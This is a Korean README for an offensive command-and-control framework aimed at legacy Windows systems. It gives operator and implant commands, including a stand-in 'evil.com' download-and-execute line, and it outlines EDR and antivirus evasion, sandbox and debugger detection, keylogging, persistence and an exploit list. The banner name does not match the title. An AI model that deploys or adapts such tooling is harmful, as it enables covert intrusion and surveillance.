# Cardinal C2 Framework

<div align="center">

```
  ███╗   ███╗ ██████╗  ██████╗ ███╗   ██╗██╗     ██╗ ██████╗ ██╗  ██╗████████╗
  ████╗ ████║██╔═══██╗██╔═══██╗████╗  ██║██║     ██║██╔════╝ ██║  ██║╚══██╔══╝
  ██╔████╔██║██║   ██║██║   ██║██╔██╗ ██║██║     ██║██║  ███╗███████║   ██║   
  ██║╚██╔╝██║██║   ██║██║   ██║██║╚██╗██║██║     ██║██║   ██║██╔══██║   ██║   
  ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝██║ ╚████║███████╗██║╚██████╔╝██║  ██║   ██║   
  ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

**레거시 Windows 시스템을 위한 고급 명령 및 제어 프레임워크**

[![License](https://img.shields.io/badge/license-Educational-red.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows-blue.svg)]()
[![Language](https://img.shields.io/badge/language-C%2FAssembly-green.svg)]()

</div>

---

## ⚠️ 면책 조항

**교육 및 승인된 보안 테스트 목적으로만 사용**

이 프레임워크는 합법적인 침투 테스트, 보안 연구 및 승인된 레드팀 작전을 위해 설계되었습니다. 무단으로 컴퓨터 시스템에 접근하는 것은 불법입니다. 저자는 이 소프트웨어의 오용이나 손상에 대해 책임을 지지 않습니다.

Cardinal C2를 사용함으로써 귀하는 다음에 동의합니다:
- 본인이 소유하거나 명시적인 서면 허가를 받은 시스템만 테스트
- 모든 관련 법률 및 규정 준수
- 방어적 보안 목적으로만 책임감 있게 사용

---

## 📋 개요

Cardinal C2 Framework는 레거시 Windows 환경의 침투 테스트를 위해 특별히 설계된 종합 명령 및 제어 시스템입니다. Cobalt Strike에서 영감을 받은 현대적인 인터페이스를 제공하면서도 구형 Windows 시스템과의 호환성을 유지합니다.

**버전 2.0**은 향상된 은폐, 성능 및 EDR/AV 우회 기능을 위한 고급 **x86 어셈블리** 개선 사항과 포괄적인 **대상 모니터링 및 제어** 시스템을 도입했습니다.

### 지원 플랫폼

- Windows 95/98/ME
- Windows 2000 (모든 서비스 팩)
- Windows XP (SP0, SP1, SP2, SP3)
- Windows Server 2003 (SP0, SP1, SP2)
- Windows Server 2008 (R1, R2)
- Windows Vista/7 (어셈블리 강화 기능)

### 주요 기능

- 🎯 **다중 프로토콜 C2**: RC4 암호화를 사용한 TCP
- 🖥️ **네이티브 GUI**: 순수 C로 작성된 Win32 API 인터페이스
- 💉 **익스플로잇 프레임워크**: 38개 이상의 CVE 익스플로잇 + 자동 생성 (71개 CVE 데이터베이스)
- 🔒 **사후 공격**: 자격 증명 덤핑, 권한 상승, 측면 이동
- 📡 **은폐 임플란트**: 안티 분석 및 직접 시스템 호출을 포함한 어셈블리 강화
- 🛠️ **확장 가능**: 사용자 정의 익스플로잇 및 페이로드를 위한 모듈식 아키텍처
- ⚡ **어셈블리 최적화**: 직접 시스템 호출, RC4 암호화, 안티 디버깅 (신규 v2.0)
- 🛡️ **EDR/AV 우회**: 직접 커널 호출을 통한 사용자 모드 후킹 우회 (신규 v2.0)
- 🔍 **안티 분석**: VM/샌드박스/디버거 탐지 (신규 v2.0)
- 👁️ **완전한 모니터링**: 키로거, 스크린샷, 프로세스 제어 (신규 v2.0)
- 🎮 **완전한 대상 제어**: 파일 작업, 레지스트리, 서비스, 권한 상승 (신규 v2.0)

---

## 🏗️ 아키텍처

```
Cardinal C2 Framework v2.0 (어셈블리 강화)
│
├── 서버 (C + 어셈블리)           # C2 서버 백엔드
│   ├── 세션 관리 (최대 100개 클라이언트)
│   ├── 명령 디스패처
│   ├── 다중 스레드 리스너
│   └── RC4 암호화 통신 (어셈블리)
│
├── 클라이언트/임플란트 (C + x86 어셈블리)  # 대상 시스템 에이전트
│   ├── 안티 분석 모듈 (stealth.asm)
│   │   ├── 디버거 탐지 (5가지 방법)
│   │   ├── VM 탐지 (VMware/VirtualBox)
│   │   ├── 샌드박스 탐지
│   │   ├── NTDLL 언후킹 (EDR 우회)
│   │   └── 프로세스 인젝션
│   ├── 직접 시스템 호출 (syscalls.asm)
│   │   ├── NtAllocateVirtualMemory
│   │   ├── NtWriteVirtualMemory
│   │   ├── NtCreateThreadEx
│   │   └── 7개 이상의 시스템 호출 (후킹 우회)
│   ├── 네트워크 최적화 (network_asm.asm)
│   │   ├── RC4 암호화 (2-3배 빠름)
│   │   ├── 암호화된 소켓 I/O
│   │   └── HTTP/DNS 빌더
│   └── 쉘코드 로더
│
├── GUI (Win32 API를 사용한 C)    # 운영자 인터페이스
│   ├── 세션 대시보드
│   ├── 리스너 구성
│   ├── 익스플로잇 런처
│   └── 명령 콘솔
│
└── 빌드 시스템 (PowerShell + Make)
    ├── 자동 컴파일 (NASM + GCC)
    ├── 어셈블리 모듈 링킹
    └── 릴리즈 패키징
```

---

## 🚀 빠른 시작

### 필수 요구사항

**빌드 도구:**
- MinGW-w64 (Windows용 GCC) 또는 MSVC
- NASM 2.15+ (어셈블리 모듈에 필요)
- GNU Make
- Python 3.8+ (익스플로잇 생성용)

**런타임 요구사항:**
- Windows 7+ (GUI 및 서버 실행용)

### 소스에서 빌드하기

#### PowerShell 빌드 스크립트 (권장)

```powershell
# 모든 것 빌드 (클라이언트, 서버, GUI, 익스플로잇)
.\Build-All.ps1

# 특정 컴포넌트 빌드
.\Build-All.ps1 -Client     # 클라이언트만
.\Build-All.ps1 -Server     # 서버만
.\Build-All.ps1 -GUI        # GUI만

# 빌드 아티팩트 정리
.\Build-All.ps1 -Clean

# 릴리즈 패키지 생성
.\Build-All.ps1 -Package
```

컴파일된 모든 바이너리는 `bin` 디렉토리에 있습니다.

#### 수동 빌드

```bash
# 기본 클라이언트 빌드
cd client
gcc implant.c -o build/Cardinal-implant.exe -lws2_32 -ladvapi32 -s

# 기본 서버 빌드
cd server
gcc main.c -o build/Cardinal-server.exe -lws2_32 -s

# GUI 빌드
cd gui
make all
```

---

## 📖 사용법

### C2 서버 시작

```powershell
# 서버 시작 (기본 포트 4444)
.\bin\Cardinal-server.exe

# 대화형 콘솔 명령
Cardinal> list                    # 활성 세션 목록
Cardinal> send 0 shell whoami     # 세션 0에서 명령 실행
Cardinal> kill 0                  # 세션 0 종료
Cardinal> stats                   # 서버 통계 표시
Cardinal> exit                    # 서버 종료
```

**서버 콘솔 명령:**

| 명령 | 설명 | 예시 |
|------|------|------|
| `list` | 모든 활성 세션 목록 | `list` |
| `send <id> <cmd>` | 세션에 명령 전송 | `send 0 shell dir` |
| `kill <id>` | 세션 종료 | `kill 0` |
| `broadcast <cmd>` | 모든 세션에 전송 | `broadcast shell whoami` |
| `stats` | 서버 통계 | `stats` |
| `exit` | 서버 종료 | `exit` |

### 임플란트 배포

```powershell
# 임플란트 실행 (코드의 C2_SERVER에 연결)
.\bin\Cardinal-implant.exe 127.0.0.1 4444
```

**구성** (`client/implant.c` 편집):
```c
#define C2_SERVER "192.168.1.100"  // 서버 IP로 변경
#define C2_PORT 4444
```

### 지원되는 명령어

#### 기본 명령어
| 명령 | 설명 | 예시 |
|------|------|------|
| `shell <cmd>` | 시스템 명령 실행 | `shell dir C:\` |
| `download <url>` | 다운로드 및 실행 | `download http://evil.com/payload.exe` |
| `inject <pid>` | 프로세스에 인젝션 | `inject 1234` |
| `persist` | 지속성 설치 | `persist` |
| `exit` | 임플란트 종료 | `exit` |
| `help` | 모든 명령어 표시 | `help` |

---

## 🛡️ 회피 기법

### 어셈블리 강화 안티 분석 (v2.0)

#### 1. 디버거 탐지 (stealth.asm)
- **PEB->BeingDebugged**: PEB+0x02의 플래그 확인
- **NtQueryInformationProcess**: 디버그 포트 탐지
- **타이밍 체크**: RDTSC 명령어 비교
- **하드웨어 중단점**: DR0-DR3 디버그 레지스터 확인
- **예외 처리**: 유효하지 않은 핸들에 대한 CloseHandle 탐지

#### 2. 가상 머신 탐지
- **CPUID 하이퍼바이저 비트**: ECX 비트 31 확인
- **VMware 백도어**: 포트 0x5658에서 IN 명령어
- **VirtualBox 서명**: CPUID 벤더 문자열 매칭

#### 3. 샌드박스 탐지
- **가동 시간 체크**: GetTickCount() < 10분
- **리소스 검증**: 2개 미만의 CPU 또는 2GB 미만의 RAM
- **슬립 가속**: 슬립 건너뛰기에 대한 타이밍 체크

#### 4. EDR/AV 우회
- **직접 시스템 호출**: INT 2Eh/SYSENTER를 통해 커널 호출 (NTDLL 후킹 우회)
- **NTDLL 언후킹**: 디스크에서 원본 시스템 호출 스텁 복원
- **API 해싱**: IAT 없이 동적 확인
- **임포트 없음**: PE 헤더에 의심스러운 임포트 없음

#### 5. 네트워크 은폐
- **RC4 암호화**: 256비트 키 스트림 암호
- **HTTP 헤더 없음**: 탐지를 피하기 위한 원시 TCP
- **하트비트 지터**: 무작위화된 비콘 간격
- **암호화된 페이로드**: 전송 전 모든 데이터 암호화

---

## 📖 CVE 참조

### 구현된 익스플로잇 (38개)

#### 네트워크/원격 익스플로잇
- **MS08-067**: CVE-2008-4250 - Windows Server Service RPC 처리
- **MS17-010**: CVE-2017-0144 - SMBv1 원격 코드 실행 (EternalBlue)
- **MS03-026**: CVE-2003-0352 - RPC DCOM 버퍼 오버플로우

#### 권한 상승 익스플로잇
- **MS10-015**: CVE-2010-0232 - Windows 커널 예외 처리기
- **MS11-046**: CVE-2011-1249 - 보조 기능 드라이버 (AFD.sys)

---

## 📄 라이선스

이 프로젝트는 교육 라이선스 하에 배포됩니다. 자세한 내용은 [LICENSE](LICENSE) 파일을 참조하십시오.

**주요 사항:**
- ✅ 교육 및 연구 사용
- ✅ 승인된 침투 테스트
- ✅ 방어적 보안 개발
- ❌ 시스템에 대한 무단 접근
- ❌ 악의적 사용
- ❌ 적절한 승인 없이 프로덕션 배포

---

## 📖 문서

- **[README_KR.md](README_KR.md)** - 한국어 개요
- **[README.md](README.md)** - 영문 개요
- **[BUILD_GUIDE.md](BUILD_GUIDE.md)** - 완전한 빌드 가이드
- **[QUICK_BUILD_GUIDE_KR.md](QUICK_BUILD_GUIDE_KR.md)** - 한국어 빠른 빌드 가이드
- **[COMMANDS.md](COMMANDS.md)** - 명령어 레퍼런스
- **[ASSEMBLY_GUIDE.md](ASSEMBLY_GUIDE.md)** - 어셈블리 모듈 설명

---

## 🔄 버전 히스토리

### v2.0 (현재) - 모니터링 및 제어 강화
- ✅ 1,500줄 이상의 모니터링/제어 어셈블리 추가
- ✅ 윈도우 제목 캡처 포함 완전한 키로거
- ✅ 스크린샷 캡처 (1920x1080 BMP)
- ✅ 프로세스 열거 및 PID/이름으로 종료
- ✅ 클립보드 모니터링 및 검색
- ✅ 파일 작업 (목록/읽기/쓰기/삭제/이동/복사)
- ✅ 레지스트리 조작 (읽기/쓰기)
- ✅ 서비스 제어 (시작/중지)
- ✅ 권한 상승 (RDP, 사용자 생성)
- ✅ 25개 이상의 모니터링/제어 명령
- ✅ 포괄적인 명령 문서

### v1.0 - 초기 릴리즈
- ✅ 기본 C2 서버/클라이언트
- ✅ 3개 CVE 익스플로잇
- ✅ Windows Forms GUI
- ✅ 기본 쉘코드 지원

---

<div align="center">

**⚠️ 기억하세요: 시스템을 테스트하기 전에 항상 적절한 승인을 받으십시오! ⚠️**

*"큰 힘에는 큰 책임이 따른다"*

**Cardinal C2 Framework v2.0**  
승인된 침투 테스트 및 보안 연구를 위해 제작

---

**[이슈 보고](https://github.com/KaztoRay/MoonLignt-C2-Framework/issues)** | 
**[빌드 가이드](BUILD_GUIDE.md)** |
**[어셈블리 가이드](ASSEMBLY_GUIDE.md)** | 
**[명령어 레퍼런스](COMMANDS.md)** |
**[라이선스](LICENSE)**

</div>
